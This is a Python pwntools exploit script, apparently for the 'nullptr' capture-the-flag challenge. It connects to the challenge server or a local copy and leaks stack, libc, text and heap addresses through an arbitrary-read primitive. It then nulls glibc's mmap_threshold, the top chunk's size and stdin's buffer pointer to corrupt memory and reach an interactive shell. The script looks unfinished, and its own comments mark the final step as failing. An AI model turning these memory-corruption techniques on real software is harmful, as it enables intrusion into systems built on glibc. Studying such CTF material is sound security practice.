#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys
import socket,ssl
import time

FILENAME = "./nullptr"
LIBCNAME = ""

hosts = ("7b0000000158d462b15a9bee.challenges.broker3.allesctf.net","localhost","localhost")
ports = (1337,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge(ix):
  global c
  c.recvuntil("> \n",timeout=1)
  c.sendline(str(ix))

'''
abc=0
def v(addr):
  global abc
  hoge(1)
  c.recvline()
  if addr==None:
    c.sendline("*")
  else:
    c.sendline(str(addr))
  if abc==3:
      c.interactive()
  _addr, val = c.recvline().rstrip().split(b": ")
  abc += 1
  return (int(_addr,16), int(val,16))
'''
def v(addr):
  hoge(1)
  c.recvuntil("\n",timeout=1)
  if addr==None:
    c.sendline("*")
  else:
    c.sendline(str(addr))
  tmp = c.recvline().rstrip().split(b": ") # なんで時々落ちるねん
  print(tmp)
  _addr, val = (tmp[0],tmp[1])
  return (int(_addr,16), int(val,16))

def n(addr):
  hoge(2)
  print("[+] NULLing OUT")
  c.recvline(timeout=0.1)
  c.sendline(str(addr))

def p(num):
  addr = num[0]
  val = num[1]
  print("[*] {}: {}".format(hex(addr), hex(val)))
  return addr, val


## exploit ###########################################

def _exploit():
  global c

  # leak each bases
  a1, v1 = p(v(None)) # first leaked stack addr
  a2, v2 = p(v(a1 - 0xd8)) # leak libc_start_main
  libcbase = v2 - 0x271e3
  mainstack_bottom = a1 - 0xe0 # main frame内の退避されたBPが置いてある場所
  a3, v3 = p(v(mainstack_bottom + 0x5*8)) # leak textbase
  main_addr = v3
  textbase = main_addr - 0x1bd
  print("[+] libcbase: {}".format(hex(libcbase)))
  print("[+] main stack bottom: {}".format(hex(mainstack_bottom)))
  print("[+] main: {}".format(hex(main_addr)))
  print("[+] textbase: {}".format(hex(textbase)))

  stdin_addr = libcbase + 0x1ea980
  stdout_addr = libcbase + 0x1eb6a0
  heap_base = p(v(stdin_addr + 8))[1] - 0x12a0 # ??? remoteでは違うかも(buf sizeが)
  print("[+] heap: {}".format(hex(heap_base)))
  raw_input("OK")

  # NULL clear mp_->mmap_threshold
  mp__addr = libcbase + 0x1ea280
  n(mp__addr + 0x10)

  # smallen old top's size
  oldtop = heap_base + 0x22b0
  n(oldtop + 9)

  raw_input("OK")

  # NULL clear stdin->__IO_buf_base and mmap
  n(stdin_addr + 7*8)
  c.interactive()
  leaked = p(v(stdin_addr + 8))[1]
  '''
  The bottom libc area is the target (in this case, fail)
    0x7fa216ac1000     0x7fa2168bd000 r-xp   1b1000 0      /glibc/2.30/64/lib/libc-2.30.so
    0x7fa2168bd000     0x7fa216abd000 ---p   200000 1b1000 /glibc/2.30/64/lib/libc-2.30.so
    0x7fa216abd000     0x7fa216ac1000 r--p     4000 1b1000 /glibc/2.30/64/lib/libc-2.30.so
    0x7fa216ac1000     0x7fa216ac3000 rw-p     2000 1b5000 /glibc/2.30/64/lib/libc-2.30.so
    0x7fa216ac3000     0x7fa216ac7000 rw-p     4000 0
  '''
  target = libcbase + 0x3b5000
  print("[+] target: {}".format(hex(target)))
  print("[+]       : {}".format(hex(leaked & 0xFFFFFFFF0000)))
  if leaked & 0xFFFFFFFF0000 != target:
    hoge(-1)
    print("[-] RETRY...\n")
    return False

  '''
  '''



def exploit():
  ret = False
  try:
    ret = _exploit()
  except ssl.SSLError:
    print("FUCK")
  return ret



## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        context.verify_mode = ssl.CERT_REQUIRED
        context.check_hostname = True
        context.load_default_certs()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_sock = context.wrap_socket(s, server_hostname=rhp1["host"])
        ssl_sock.connect((rhp1["host"],rhp1["port"]))
        c = remote.fromsocket(ssl_sock)
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])

    fail = True
    while fail:
      if exploit() == False:
        c.close()
        sleep(0.5)
        if len(sys.argv)>1:
          if sys.argv[1][0]=="d":
            cmd = """
              set follow-fork-mode parent
            """
            c = gdb.debug(FILENAME,cmd)
          elif sys.argv[1][0]=="r":
            context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
            context.verify_mode = ssl.CERT_REQUIRED
            context.check_hostname = True
            context.load_default_certs()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ssl_sock = context.wrap_socket(s, server_hostname=rhp1["host"])
            ssl_sock.connect((rhp1["host"],rhp1["port"]))
            c = remote.fromsocket(ssl_sock)
          elif sys.argv[1][0]=="v":
            c = remote(rhp3["host"],rhp3["port"])
        else:
            c = remote(rhp2['host'],rhp2['port'])

    c.interactive()
